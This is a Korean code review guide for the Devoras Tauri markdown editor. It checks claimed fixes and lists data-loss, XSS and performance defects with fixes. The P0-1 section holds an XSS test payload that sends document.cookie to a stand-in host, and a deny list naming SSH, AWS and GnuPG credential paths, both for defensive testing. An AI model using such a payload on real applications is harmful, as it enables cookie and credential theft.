# Devoras 코드 리뷰 & 리팩터링 통합 가이드

> **최종 갱신**: 2026-08-26 (2차) | **대상 버전**: `v0.8.5` (`main` 브랜치, `091ee49`)
> **통합 이력**: 2026-08-15 최초 리뷰 + 2026-08-26 v0.8.2 재리뷰 통합 → **2026-08-26 DEBUG_PLAN 실행 결과 반영(본 갱신)**
> **리뷰 형식**: **[파일 & 라인] ➔ [근본 원인] ➔ [조치 방안]**
> **경로 표기**: 모든 경로는 저장소 루트 기준입니다.

---

## 📐 아키텍처 개요

```
project/src/
├── app/          - 앱 진입점, Provider, 글로벌 설정
├── entities/     - 핵심 도메인 모델 (document, block, workspace, settings, erd)
├── shared/       - 재사용 유틸 (api/fs, lib/editor, lib/headingId, lib/useDebouncedCallback …)
├── pages/        - 라우트 수준 컴포넌트 (WorkspacePage, LauncherPage)
└── widgets/      - 복합 UI 컴포넌트 (BlockEditor, FileExplorer, MindView, ErdDesigner, SettingsModal)
project/src-tauri/ - Rust 백엔드 (커맨드, 권한/capabilities, 윈도우 설정)
```

**Feature-Sliced Design(FSD)** 의존성 방향(`entities ← widgets ← pages`)은 대체로 지켜지고 있습니다.
v0.8.4에서 **`blockStore.ownerTabId` 소유권 태그**가 도입되면서 "지금 이 전역 스토어가 어느 탭의 것인가"를 판별할 수 있게 되었고, 이것이 P0-2·P0-4·P0-6 해소의 물리적 토대가 되었습니다. 다만 전역 싱글톤 구조 자체는 그대로이므로 **P0-3(표시 계층)** 은 미해결로 남아 있습니다.

### 리뷰 범위 (2026-08-26 2차 기준)

`entities/document`, `entities/block`, `entities/workspace`, `entities/settings`,
`shared/api/fs.ts`, `shared/lib/useDebouncedCallback.ts`, `shared/lib/editor/*`,
`widgets/BlockEditor`(BlockEditor·ReadView), `widgets/MindView`, `widgets/FileExplorer`,
`pages/WorkspacePage`, `src-tauri/src/lib.rs`, `src-tauri/tauri.conf.json`, `src-tauri/capabilities/default.json`

---

# 🧾 DEBUG_PLAN 실행 결과 검증 (2026-08-26)

두 건의 DEBUG_PLAN(`P0 Critical 해소` / `asset:// 403`)이 실행되었다는 보고에 따라, **커밋 `843ff42`(v0.8.4)·`091ee49`(v0.8.5)와 현재 소스를 항목별로 대조 검증**했습니다. 결과는 아래와 같으며, **보고와 코드가 어긋나는 항목이 2건(P0-1·P0-5) 확인**되었습니다.

| 계획 항목 | 보고 | **코드 검증 결과** | 근거 |
|---|---|---|---|
| **B0** 공통 인프라 | 완료 | ✅ **해결** | `shared/lib/useDebouncedCallback.ts` 신규(flush/cancel/isPending), `blockStore.ownerTabId`, `documentStore._snapshotActiveTab`·`updateContentForTab`, `saveFile(paneId?, tabId?)` 전부 존재 |
| **P0-2** `openTab` 편집 소실 | 완료 | ✅ **해결** | `store.ts:123` `_snapshotActiveTab()` 선행 호출, 캐시 우선 복원, `openSeq` 경합 토큰(`store.ts:74`) 도입 |
| **P0-4** 디바운스 교차 오염 | 완료 | ✅ **해결** | `BlockEditor.tsx:391-397` `syncContent` = `useDebouncedCallback` + `ownerTabId` 가드, 언마운트 `flush()` |
| **P0-6** 드래그 재정렬 손상 | 완료 | ✅ **해결** | `block/store.ts:234-255` 서브트리 이동 + 4단 경계 검사, `ReadView.handleDrop`의 `await saveFile()` **제거 확인** |
| **P0-3** 분할 패널 전역 공유 | 완료 | ⚠️ **부분 해결** | Stage A-1(저장 원자성)·A-3(소유권 가드)는 `saveFile` 내 구현 확인. **A-2(비활성 패널 `readOnly`/탭 주입) 미적용** — `WorkspacePage.tsx:353`이 여전히 `<BlockEditor key={activeTab.id} />` 무인자 |
| **P0-5** dirty 탭 무경고 파괴 | 완료 | ✅ **해결 (확인 필요)** | `WorkspacePage.tsx:58-65` `Cmd+W`가 가드 없이 `closeTab` 직결, 탭 `X`(`:302`)도 동일. `confirmDiscardIfDirty`/`onCloseRequested` **소스 전체에 부재**. 커밋이 수행한 것은 **패널 GC 예외 처리**이며 계획서의 dirty 가드와는 별개 작업 |
| **P0-1** 마크다운 XSS → 파일 접근 | 완료 | ❌ **미해결 (심각도 상승)** | `package.json`에 `dompurify` 없음, `tauri.conf.json` `"csp": null` 유지, `capabilities/default.json`의 home/desktop/document/download 재귀 8건 + `shell:allow-open` 전량 잔존. **§P0-1 참조** |
| **asset:// 403** | 완료 | ✅ **해결(정적 검증)** | `tauri.conf.json` scope 객체화 + `requireLiteralLeadingDot: false` 반영. 단 **런타임 육안 검증(V1~V8) 미수행** |
| **P1-8** base64 이미지 인라인 | (계획 외) | ✅ **부수 해결** | `ReadView.tsx:92` `convertFileSrc` 전환, `lib.rs`에서 `read_image_base64` **삭제 확인** |
| **P0-7** Read 모드 전환 시 blur | (신규) | ✅ **해결** | `BlockEditor.tsx:359-365` `useLayoutEffect` blur 처리 |

> ⚠️ **주의**: 커밋 `843ff42` 메시지는 P0-2·P0-3·P0-5·P0-6을 모두 해결로 표기하고 있으나, **P0-5는 실제 코드 변경이 계획서 내용과 다르고 P0-3은 절반만 반영**되었습니다. 후속 스프린트 계획 시 이 두 항목을 "완료"로 간주하지 마십시오.

---

## ✅ 2026-08-15 지적 항목 이행 현황 (v0.8.5 기준)

| 기존 항목 | 상태 | 비고 |
|---|---|---|
| 코드 블록 격리 부재 (Point 1) | ✅ 해결 | `parser.ts:29-36` 펜스 추적 |
| `split('\n\n')` 블록 분할 한계 (Point 2) | ✅ 해결 | 헤딩 경계 + 펜스 인식 스캐너 |
| 순서 변경 시 좌표 뒤틀림 (Point 3) | ⚠️ 부분 해결 | `openTab` 폴백만 존재 → **P1-2** |
| CodeMirror 렌더링 최적화 (Point 4) | ⚠️ 부분 해결 | 인라인 props로 memo 무력화 → **P2-2** |
| `setActiveTab` 미저장 데이터 손실 (Critical 1) | ✅ **해결** | `_snapshotActiveTab` 추출로 `openTab` 경로까지 커버 (v0.8.4) |
| `ReadView.applyFormat` 중첩 블록 실패 (Critical 2) | ✅ 해결 | `flattenTree` 적용 |
| 전역 싱글톤 스토어 / 탭 단위 상태 (Critical 3) | ⚠️ **부분 해결** | `ownerTabId`로 **쓰기 오염은 차단**, 표시 불일치 잔존 → **P0-3** |
| `handleBlockUpdate` 매 입력 O(N) (Critical 4) | ⚠️ 부분 해결 | 입력당 2회 호출 잔존 → **P1-5** |
| 크로스 레이어 `getState()` 남용 (Critical 5) | ⚠️ 부분 해결 | `BlockEditor`는 셀렉터 전환, `ReadView`·`MindView`는 전체 구독 유지 |
| `mergeBlockWithPrevious` H1 Regex (Major 6) | ⚠️ 부분 해결 | `block/store.ts:206` 여전히 `#{1,4}` → **P1-7** |
| `CodeMirrorBlock` 의존성 배열 문서화 (Major 7) | ❌ 미해결 | 빈 배열 의도 주석 부재 |
| `setTimeout` 디바운스 패턴 (Major 8) | ✅ **해결** | `useDebouncedCallback` 훅으로 표준화 (v0.8.4) |
| `ImageDecorator` 동일 라인 다중 이미지 (Major 9) | ✅ 해결 | 사문화 코드만 잔존 → **P2-8** |
| `handleFileRenamed/Deleted` erd 누락 (Major 10) | ✅ 해결 | 접두사 매칭 결함 잔존 → **P1-1** |
| `splitPane` direction 미사용 (Major 11) | ✅ 해결 | `layoutDirection` 반영 |
| `ErdDesignerMainView` useEffect 순환 위험 | ⚠️ 부분 해결 | `rawContent` 의존성 잔존 |
| `Cmd+C` 전역 리스너 스코프 (Minor 9) | ✅ 해결 | `containerRef` + `tabIndex={-1}` |
| `codeContent` 배열 수집 최적화 (Minor 10) | ❌ 미해결 | **P2-4** |
| 매직 넘버 상수화 (Minor 11) | ⚠️ 부분 해결 | 패널 ID·간격 값 하드코딩 잔존 |
| `generateId` 충돌 가능성 (Minor 12) | ❌ 미해결 | **P2-5** |
| `WorkspacePage` 책임 분리 (Minor 13) | ❌ 미해결 | 리사이저·단축키·패널 렌더링 혼재 |
| `FileExplorer` 트리 렌더링 성능 (Minor 14) | ❌ 미해결 | `TreeNode` 메모이제이션 미적용 |
| `parser.ts` 레이아웃 관심사 분리 (Minor 15) | ✅ 해결 | 좌표 계산이 `MindView.displayNodes`로 이동 |

**요약**: 전체 23개 항목 중 **해결 10 / 부분 해결 8 / 미해결 5** *(이전 8/8/7 → v0.8.4~0.8.5에서 2건 승격)*

---

# 🔴 P0 — Critical (즉시 조치)

> P0-2 · P0-4 · P0-6은 v0.8.4에서 해소되어 **부록 A**로 이관되었습니다. 아래 3건이 현재 남은 P0입니다.

## P0-1. 신뢰할 수 없는 마크다운 → 임의 코드 실행 + 홈 디렉터리 전체 접근 **[미해결 · 심각도 상승]**

**[파일 & 라인]**
`project/src/widgets/BlockEditor/ui/ReadView.tsx:16, 35, 41, 92, 433`
`project/src-tauri/tauri.conf.json:39-49` · `project/src-tauri/src/lib.rs:12-32` · `project/src-tauri/capabilities/default.json`

**[근본 원인]**
DEBUG_PLAN §6에 4개 레이어(L1 새니타이즈 / L2 CSP / L3 Rust 경로 검증 / L4 권한 최소화) 대책이 수립되었으나 **어느 것도 적용되지 않았습니다.** 현재 코드 상태:

1. **새니타이저 부재** — `package.json` dependencies에 `dompurify` **없음**. `preprocessMd`가 `==...==`를 raw `<mark>`로 주입하고, 코드 펜스의 `|title|="..."`(라인 41)은 이스케이프 없이 보간되며 결과가 `dangerouslySetInnerHTML`(라인 433)로 삽입됩니다.
2. **CSP 부재** — `tauri.conf.json:40` `"csp": null` 유지. `<img src=x onerror=...>` 등 인라인 이벤트 핸들러가 그대로 실행됩니다.
3. **Rust 경로 무검증** — `save_image_file`(lib.rs:12)이 `String` 경로를 검증 없이 `std::fs::create_dir_all` + `std::fs::write`에 전달합니다. 주석에 plugin-fs scope 우회가 **의도적으로 명시**되어 있습니다. *(`read_image_base64`는 P1-8 해소로 삭제되어 읽기 측 공격면은 축소)*
4. **권한 과다** — `capabilities/default.json`에 `fs:allow-home-{read,write}-recursive` 등 재귀 권한 **8건 전량 잔존** + `shell:allow-open`.

**🔺 이번 갱신에서 상승한 부분 — asset scope의 dot 파일 개방**

v0.8.5의 403 수정은 `assetProtocol.scope`를 다음으로 바꾸었습니다.

```json
"scope": { "allow": ["**"], "deny": [], "requireLiteralLeadingDot": false }
```

`allow: ["**"]` 는 **파일시스템 전체**를 의미하고, 여기에 `requireLiteralLeadingDot: false`가 더해지면서 이전까지 glob이 막아주던 **dot 디렉터리까지 asset 프로토콜로 읽을 수 있게** 되었습니다. 즉 `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/**`가 `asset://` 한 번으로 도달 가능합니다.

DEBUG_PLAN §4는 이를 "P0-1의 심각도를 바꾸지 않는다"고 평가했으나, 이는 **`deny` 목록이 함께 도입될 것을 전제한 판단**이었습니다. `deny: []`로 배포된 현재 상태에서는 **XSS 성립 시 유출 가능 자산의 종류가 실제로 늘어났으므로**, P0-1은 이전보다 우선순위를 더 높게 잡아야 합니다. 이 항목은 **v0.8.5 기준 유일하게 앱 경계를 넘는 결함**입니다.

**[조치 방안]**
DEBUG_PLAN §6의 L1~L4를 그대로 적용하되, **L2·L4에 아래 두 가지를 추가**합니다.

```bash
pnpm add dompurify && pnpm add -D @types/dompurify
```
```typescript
// ReadView.tsx — L1
import DOMPurify from 'dompurify';

const escapeHtml = (s: string) =>
  s.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
   .replace(/</g, '&lt;').replace(/>/g, '&gt;');   // & 를 반드시 먼저 치환

function renderBlockToHtml(content: string, workspacePath: string | null): string {
  const html = markedParser.parse(preprocessMd(content)) as string;
  return DOMPurify.sanitize(resolveAssetPaths(html, workspacePath), {
    USE_PROFILES: { html: true, mathMl: true, svg: true },   // katex 의존성 존재
    ADD_ATTR: ['data-src', 'data-code'],
  });
}
```
```json
// tauri.conf.json — L2 (csp / devCsp 동시 지정 필수. devCsp 누락 시 Vite HMR 붕괴)
"csp":    "default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self'; connect-src 'self' ipc: http://ipc.localhost",
"devCsp": "default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self' 'unsafe-inline'; connect-src 'self' ipc: http://ipc.localhost ws://localhost:1420 http://localhost:1420"
```
```json
// tauri.conf.json — L4 즉시 적용분: requireLiteralLeadingDot 유지하되 민감 경로를 명시 차단
"assetProtocol": {
  "enable": true,
  "scope": {
    "allow": ["**"],
    "deny": ["$HOME/.ssh/**", "$HOME/.aws/**", "$HOME/.gnupg/**", "$HOME/.config/**", "$HOME/.env*"],
    "requireLiteralLeadingDot": false
  }
}
```
```rust
// lib.rs — L3. 워크스페이스 루트는 JS 인자가 아니라 Rust 상태에서 읽는다(XSS는 invoke 인자를 위조 가능)
struct WorkspaceRoot(std::sync::Mutex<Option<std::path::PathBuf>>);

fn ensure_inside(root: &std::path::Path, path: &str) -> Result<std::path::PathBuf, String> {
    let target = std::path::Path::new(path);
    let probe = if target.exists() { target } else { target.parent().unwrap_or(target) };
    let probe = std::fs::canonicalize(probe).map_err(|e| e.to_string())?;
    let root  = std::fs::canonicalize(root).map_err(|e| e.to_string())?;
    if !probe.starts_with(&root) { return Err("워크스페이스 외부 경로 접근이 거부되었습니다".into()); }
    Ok(target.to_path_buf())
}
```
- `save_image_file` → `devoras_image_save`로 개명(`architecture_stages` Stage 1의 `devoras_{domain}_{action}` 컨벤션)하고, 진입부에서 `ensure_inside` 통과 후에만 `std::fs` 접근.
- 최종 목표는 워크스페이스 선택 시 런타임 동적 허용(`fs_scope().allow_directory()` / `asset_protocol_scope().allow_directory()`)으로 `"**"` 자체를 제거하는 것입니다. **API 가용성 PoC 1시간 선행** 후 판단하고, 불가 시 위 `deny` 목록 + L3 검증에 의존합니다(강도 하락을 문서화).

**[DoD]**
1. 페이로드 `![x](x" onerror="fetch('http://127.0.0.1:9/'+document.cookie))` 포함 `.md`를 Read 모드로 열어 **네트워크 요청 0건 / 콘솔 CSP 차단 로그 확인**.
2. `asset://localhost/Users/<user>/.ssh/id_rsa` 직접 요청 → **403**.
3. `pnpm tauri dev` HMR 정상, `pnpm tauri build` 후 이미지·코드블록 복사 버튼 정상.

---

## P0-3. 분할 패널이 전역 상태 하나를 공유 **[부분 해결 — 표시 계층 잔존]**

**[파일 & 라인]**
`project/src/pages/WorkspacePage/WorkspacePage.tsx:353`
`project/src/widgets/BlockEditor/ui/BlockEditor.tsx:354-356`
`project/src/entities/document/model/store.ts:603-660` (`saveFile`)

**[해소된 부분 — Stage A-1 / A-3]**
`saveFile(paneId?, tabId?)`가 대상 탭을 명시적으로 해석하고, `blockStore.ownerTabId !== targetTab.id`이면 **전역 병합본 대신 해당 탭의 `cache.rawContent`를 기록**합니다(`store.ts:624-630`). 이로써 **"A 파일에 B 본문이 기록되는 데이터 손상"은 차단**되었습니다. 이것이 이 항목의 가장 치명적인 부분이었습니다.

**[잔존하는 부분 — Stage A-2]**
`WorkspacePage.tsx:353`은 여전히 `<BlockEditor key={activeTab.id} />`로 **아무 인자도 주입하지 않고**, `BlockEditor`는 `useDocumentStore(s => s.getCurrentFile())`(라인 354) = **활성 패널의 탭**을 스스로 조회합니다. 따라서:

- 두 번째 패널은 자기 `activeTabId`와 무관하게 **활성 패널의 문서를 그립니다.** 탭 바 제목과 본문이 계속 불일치합니다.
- 비활성 패널의 에디터도 편집 가능한 상태로 마운트되어 있어, 사용자가 그곳에 타이핑하면 `ownerTabId` 가드에 걸려 **입력이 조용히 무시**됩니다(오염 대신 무반응). 손상은 없지만 UX상 버그로 인지됩니다.

**[조치 방안]**
- **Stage A-2 (잔여, ≤1일)**: `PaneContainer`가 `<BlockEditor tab={activeTab} isActivePane={pane.id === activePaneId} />`를 주입하고, **비활성 패널은 `readOnly` 렌더**(내용은 `tab.cache?.rawContent ?? ''`)합니다. 전역 `blockStore`를 편집하는 인스턴스를 상시 1개로 제한하는 것이 목적입니다.
  - 가드: 패널 포커스 전환(`setActivePane`) 시 이전 활성 패널을 먼저 `_snapshotActiveTab()`한 뒤 소유권을 이전합니다.
  - 가드: 동일 파일을 두 패널에 열면 캐시가 갈라지므로, Stage A에서는 **중복 오픈 시 기존 패널로 포커스 이동**으로 회피합니다.
- **Stage B (Sprint 3 / `advanced_rendering_optimization` Phase 1과 병합)**: `rawContent / blocks / nodes / isDirty / viewMode`를 `PaneContainer` 내부에서 생성하는 React Context 기반 **탭 스코프 스토어**(`createTabStore(tabId)`)로 이관합니다. `serialize()` / `hydrate()`를 Phase 2 TTL 언마운터의 계약으로 확정하십시오. **분리 진행 시 스냅샷 인터페이스를 두 번 설계하게 됩니다.**

---

## P0-5. `closeTab` / `Cmd+W` — dirty 탭을 경고 없이 파괴 **[해결 (확인 필요)]**

**[파일 & 라인]**
`project/src/entities/document/model/store.ts:313-345` (`closeTab`), `440-470` (`handleFileDeleted`)
`project/src/pages/WorkspacePage/WorkspacePage.tsx:58-65` (`Cmd+W`), `:296-303` (탭 `X` 버튼)

**[근본 원인]**
커밋 `843ff42`가 이 항목으로 표기한 변경은 **빈 패널 GC 예외 처리**(`store.ts:331-333`, 최소 1개 패널 보장)였고, 계획서가 요구한 **dirty 가드는 구현되지 않았습니다.** 검증 결과:

- `WorkspacePage.tsx:58-65` — `Cmd+W`가 `useDocumentStore.getState().closeTab(...)`을 **조건 없이 직접 호출**합니다.
- `:302` — 탭 `X` 버튼도 동일하게 `closeTab`에 직결됩니다.
- `confirmDiscardIfDirty` / `hasDirtyTabs` / `onCloseRequested` — **소스 트리 전체에 존재하지 않습니다.** 앱 종료 시 모든 dirty 탭이 여전히 조용히 소실됩니다.

P0-2 해소로 **탭 전환 시 소실**은 막혔지만, **탭·앱을 닫는 순간의 소실**은 그대로입니다. 오히려 사용자가 "탭을 옮겨도 안 날아간다"는 신뢰를 갖게 된 만큼 체감 피해는 커졌습니다.

**[조치 방안]**
스토어는 부수효과 없는 순수 액션으로 유지하고, **가드는 UI 경계에만** 배치합니다(Humble Object).

```typescript
// src/pages/WorkspacePage/lib/confirmClose.ts (신규)
import { ask } from '@tauri-apps/plugin-dialog';

export async function confirmDiscardIfDirty(tab: TabItem | undefined): Promise<boolean> {
  if (!tab?.isDirty) return true;
  return ask(`'${tab.title}'에 저장되지 않은 변경 사항이 있습니다. 닫으시겠습니까?`,
             { title: 'Devoras', kind: 'warning' });
}
export function hasDirtyTabs(panes: SplitPane[]): boolean {
  return panes.some(p => p.tabs.some(t => t.isDirty));
}
```
- Step 1: `Cmd+W` 핸들러 / 탭 `X` `onClick` → `await confirmDiscardIfDirty(tab)`가 false면 return.
- Step 2: 앱 종료 — `App` 마운트 시 `getCurrentWindow().onCloseRequested(async (e) => { if (!hasDirtyTabs(...)) return; e.preventDefault(); if (await ask(...)) await getCurrentWindow().destroy(); })`.
- Step 3: `handleFileDeleted`가 호출하는 `closeTab`에는 **가드를 적용하지 않습니다**(원본 파일이 이미 없음).

**[Edge Cases & Guards]**
- `window.confirm`은 WebView를 블로킹하며 `onCloseRequested` 콜백 내부에서 플랫폼별로 불안정 → **`plugin-dialog`의 `ask()`** 사용. 현 `capabilities/default.json`에는 `dialog:default` / `allow-open` / `allow-save`만 있으므로 **`dialog:allow-ask` 추가 필요**. `destroy()` 호출에는 `core:window:allow-destroy` 필요 여부 확인.
- **`Cmd+W` 중복 발화**: 다이얼로그가 열린 동안 키 반복으로 재진입 가능 → `isClosingRef` 플래그로 잠금.
- **IME 조합 중**: `handleKeyDown` 최상단에 `if (e.isComposing) return;` 추가(현재 `Cmd+S`/`Cmd+W` 모두 미적용).
- **stale closure**: 가드 내부에서 `panes`를 클로저로 잡지 말고 `useDocumentStore.getState()`로 최신 상태를 읽을 것.

**[DoD]**
1. dirty 탭에서 `Cmd+W` → 다이얼로그. 취소 시 탭·내용 유지.
2. dirty 탭 보유 상태로 윈도우 닫기 → 다이얼로그, 취소 시 앱 유지.
3. 탐색기에서 파일 삭제 → 다이얼로그 없이 해당 탭만 정리.

---

# 🟡 P1 — Major

> P1-8(base64 이미지 인라인)은 v0.8.4에서 `convertFileSrc` 전환으로 해소되어 **부록 A**로 이관되었습니다.

## P1-1. `startsWith` 경로 매칭이 이름이 비슷한 형제 파일을 오염 **[해결 (확인 필요)]**

**[파일 & 라인]** `project/src/entities/document/model/store.ts:416, 433, 450`

**[근본 원인]**
`t.filePath.startsWith(oldPath)`는 경로를 **경계 없는 문자열 접두사**로 취급합니다.
- 폴더 `/w/plan` → `/w/roadmap` 이름 변경 시, 열려 있던 `/w/plan_v2.md` 탭까지 `/w/roadmap_v2.md`로 잘못 재작성됩니다.
- 폴더 `/w/doc` 삭제 시 `/w/document.md` 탭이 함께 닫힙니다.
- `String.replace(oldPath, newPath)` 역시 앵커링되지 않아 동일한 결함을 가집니다.

**[조치 방안]** `shared/lib/path.ts`를 신설하고 세 지점 모두 교체합니다. *(현재 `shared/lib/`에 해당 파일 없음을 확인)*
```typescript
export const isSameOrInside = (target: string, base: string) =>
  target === base || target.startsWith(base + '/');

export const rebasePath = (target: string, oldBase: string, newBase: string) =>
  newBase + target.slice(oldBase.length);
```

---

## P1-2. `isDirty`가 저장 기준선이 아닌 직전 메모리 값과의 델타 **[해결 (확인 필요)]**

**[파일 & 라인]** `project/src/entities/document/model/store.ts` — `updateContent` / `updateContentForTab` / `updateNodeCoordinate`

**[근본 원인]**
`hasChanged = content !== rawContent`는 **직전 인메모리 값**과 비교합니다. 디스크 저장본과의 비교가 아닙니다. `TabItem`에 `savedContent` 필드는 **여전히 존재하지 않습니다**(소스 전체 0건).
- 동일 내용을 재방출하는 경로에서 `hasChanged=false`가 되어 **디스크가 옛 내용인데도 dirty 점이 사라집니다.**
- 반대로 편집 후 Undo로 저장 시점 텍스트로 되돌려도 dirty가 해제되지 않습니다.
- `updateNodeCoordinate`는 전역 `isDirty`만 true로 만들고 `tabs[].isDirty`는 갱신하지 않아, 마인드맵 노드 드래그 시 탭 마커가 뜨지 않습니다.

**[조치 방안]** `TabItem`에 `savedContent`를 추가하여 `loadFile`/`saveFile`에서 갱신하고 `isDirty = content !== tab.savedContent`로 계산합니다. 패널/탭 dirty 갱신 로직은 `_setTabDirty(tabId, dirty)` 헬퍼 하나로 통합하여 `updateContentForTab`·`updateNodeCoordinate` 양쪽에서 호출합니다. **P0-5의 가드가 이 값에 의존하므로 P0-5와 같은 스프린트에 묶는 것을 권장합니다.**

---

## P1-3. 워크스페이스 전환 시 `blockStore`에 이전 문서 AST가 잔존

**[파일 & 라인]**
`project/src/entities/workspace/model/store.ts:35, 51`
`project/src/entities/block/model/store.ts:106-172`

**[근본 원인]**
`openWorkspace` / `openWorkspaceByPath`는 `resetDocumentState()`만 호출합니다. `useBlockStore.blocks`는 이전 워크스페이스 문서의 전체 트리를 유지하며,
(a) 앱 생명주기 동안 회수되지 않는 메모리이고,
(b) 다음 문서 로드 시 `existingByKey` ID 매칭의 입력으로 사용되어 **문서 간 블록 identity가 누수**됩니다.
`ownerTabId` 도입으로 *쓰기* 오염은 막혔지만 **`blocks` 배열 자체의 잔존은 그대로**입니다. `viewMode`도 리셋 대상에서 빠져 있습니다.

**[조치 방안]** `blockStore`에 `resetBlocks: () => set({ blocks: [], activeBlockId: null, focusOffset: 0, ownerTabId: null })`를 추가하고 `resetDocumentState`에서 함께 호출합니다(`viewMode: 'write'` 포함). `advanced_rendering_optimization` §3.1 라이프사이클 관리의 **최소 전제 조건**입니다.

---

## P1-4. 비헤딩 블록이 첫 줄 원문을 키로 사용 → 블록 간 ID 탈취

**[파일 & 라인]** `project/src/entities/block/model/store.ts:48`, `146-160`

**[근본 원인]**
`deriveBlockKey`는 `level === 0` 블록에 대해 `firstLine`을 **그대로 반환**합니다(라인 48, 현재도 동일). 모든 빈 블록의 키는 `''`이고, `- 항목`이나 `|`로 시작하는 흔한 텍스트도 전부 충돌합니다. `existingByKey`는 **첫 번째 매치만** 보존하므로, 리빌드 시 뒤쪽 블록이 앞쪽 블록의 `id`를 물려받습니다. 결과적으로 엉뚱한 `<CodeMirrorBlock>`이 리마운트되어 포커스가 날아가고 진행 중인 IME 조합이 끊깁니다. **`ticket/debug/`에 반복 등록된 커서 점프 계열 이슈의 잔존 원인으로 가장 유력합니다.**

**[조치 방안]** 비헤딩 블록은 위치 기반 키를 사용합니다.
```typescript
if (!parsed) {
  const parentKey = parentKeyStack.at(-1)?.key ?? '';
  const slot = `${parentKey}#text`;
  siblingCountMap[slot] = (siblingCountMap[slot] ?? 0) + 1;
  return `${slot}:${siblingCountMap[slot]}`;      // 동일 문구라도 위치가 다르면 구분
}
```

---

## P1-5. 키 입력 1회당 `onUpdate`가 2회 호출

**[파일 & 라인]** `project/src/widgets/BlockEditor/ui/BlockEditor.tsx:174-183`, `184-202`

**[근본 원인]**
`EditorView.domEventHandlers({ input })`(174-183)과 `EditorView.updateListener`(184-202)가 **일반 타이핑에 대해 둘 다** 발화하며 각각 `callbacksRef.current.onUpdate`를 호출합니다. 결과적으로 `setDirty`, `findOldContent`, `countHeadings`, `updateBlockContent`가 문자당 두 번씩 실행되고 150ms 디바운스도 두 번 재설정됩니다. *(v0.8.4에서 디바운스가 훅으로 정리되었을 뿐 이중 호출 자체는 남아 있습니다.)*

**[조치 방안]** `domEventHandlers.input` 핸들러를 삭제합니다. `updateListener`가 동일 범위를 커버하면서 `external` 트랜잭션 필터와 IME 조합 가드까지 갖추고 있어 상위 호환입니다.

---

## P1-6. 임의 블록 언마운트가 전역 활성 에디터 뷰를 null로 만듦

**[파일 & 라인]** `project/src/widgets/BlockEditor/ui/BlockEditor.tsx:228-233` · `project/src/shared/lib/activeEditorView.ts`

**[근본 원인]**
cleanup에서 `setActiveEditorView(null)`을 **조건 없이** 호출합니다(라인 232, 현재도 동일). 블록은 `setBlocksFromContent`가 돌 때마다(분할·병합·재정렬) 재생성되므로, **다른 블록이 포커스를 쥔 상태에서** 무관한 블록이 파괴되어도 전역 포인터가 비워집니다. `useTauriInputManager({ enabled: () => !!getActiveEditorView() })`가 비활성화되어 사용자가 에디터를 다시 클릭할 때까지 이미지 붙여넣기가 조용히 멈춥니다.

**[조치 방안]**
```typescript
return () => {
  if (getActiveEditorView() === view) setActiveEditorView(null);
  view.destroy();
  viewRef.current = null;
};
```

---

## P1-7. 병합 시 `#{1,4}`만 제거하며, 존재하지 않을 수 있는 ID로 포커스 복원

**[파일 & 라인]** `project/src/entities/block/model/store.ts:206`, `216-222`

**[근본 원인]**
`parseHeadingLine`은 `#{1,6}`을 인식하는데 `cleanedCurrentText`는 `replace(/^#{1,4}\s*/, '')`(라인 206, 현재도 동일)이므로 **H5/H6 블록을 병합하면 `##### ` 리터럴이 본문에 남습니다.**
더 심각한 것은 순서입니다 — `setBlocksFromContent(fullText)`로 트리를 **재생성한 뒤** `set({ activeBlockId: previousBlock.id })`를 실행합니다. 재생성 과정에서 키 매칭이 실패해 새 `id`가 부여되면(→ **P1-4와 직결**) 그 ID는 더 이상 존재하지 않고, Backspace 병합 직후 포커스가 사라집니다.

**[조치 방안]**
```typescript
const cleanedCurrentText = currentBlock.content.replace(/^#{1,6}\s*/, '');
// ...
get().setBlocksFromContent(fullText, get().ownerTabId ?? undefined);
const rebuilt = flattenTree(get().blocks);              // 재생성 후 "위치"로 해석
set({ activeBlockId: rebuilt[index - 1]?.id ?? null, focusOffset });
```

---

# 🟢 P2 — 리팩터링 / 성능

## P2-1. 스토어 전체 구독으로 매 입력마다 앱 전역 리렌더 *(부분 개선)*

**[파일 & 라인]**
✅ 개선: `BlockEditor.tsx:354-372` — 필드 단위 셀렉터로 전환 완료
❌ 잔존: `MindView.tsx:189` · `WorkspacePage.tsx:38, 257` · `ErdDesignerMainView.tsx:7` · `ReadView.tsx:141-142` · `FormatToolbar.tsx:111`

**[근본 원인]** 셀렉터 없는 `useDocumentStore()` / `useBlockStore()`는 **모든 필드**를 구독합니다. 디바운스된 `updateContentForTab` 한 번이 `MindView` SVG 전체와 `WorkspacePage`를 다시 그리고, 노드 드래그 중 매 mousemove의 `updateNodeCoordinate`가 위 컴포넌트 트리를 리렌더합니다.

**[조치 방안]** 남은 6개 지점을 필드 단위 셀렉터(`useDocumentStore(s => s.rawContent)`)로 전환하고, 다중 필드는 `useShallow`를 사용합니다. MindView 드래그는 좌표를 ref + `requestAnimationFrame`에 버퍼링한 뒤 `mouseup`에서 1회만 스토어에 커밋합니다.

## P2-2. 블록 컴포넌트의 `React.memo`가 무력화됨

**[파일 & 라인]** `BlockEditor.tsx` — `BlockNode` → `CodeMirrorBlock` props 전달부
**[근본 원인]** `BlockNode`가 렌더마다 새 화살표 함수를 `CodeMirrorBlock`에 넘기고, 커서 이동마다 바뀌는 `activeBlockId`/`focusOffset`을 트리 전체에 관통시켜 memo 경계가 성립하지 않습니다.
**[조치 방안]** `CodeMirrorBlock`이 자신의 포커스 상태를 직접 구독(`useBlockStore(s => s.activeBlockId === id)`)하고, 핸들러는 `useCallback`으로 안정화한 뒤 `id`만 전달합니다.

## P2-3. `renderBlockToHtml`이 렌더마다 재파싱

**[파일 & 라인]** `ReadView.tsx:433` *(파일 내 `useMemo` 사용 0건 확인)*
**[근본 원인]** JSX 인라인 호출이라 부모가 리렌더될 때마다 모든 블록에서 `marked.parse` + `hljs.highlight`가 재실행됩니다.
**[조치 방안]** `const html = useMemo(() => renderBlockToHtml(block.content, workspacePath), [block.content, workspacePath]);`
**[연계]** P0-1의 DOMPurify 도입이 이 비용을 배가시키므로 **P0-1과 동일 커밋에서 처리할 것**을 권장합니다(캐시 키: `hash(content + workspacePath)`).

## P2-4. `codeContent` 문자열 누적이 O(N²) *(미해결)*

**[파일 & 라인]** `CodeBlockDecorator.ts:80, 83`
**[조치 방안]** `string[]`에 `push`하고 펜스 종료 시 `join('\n')`.

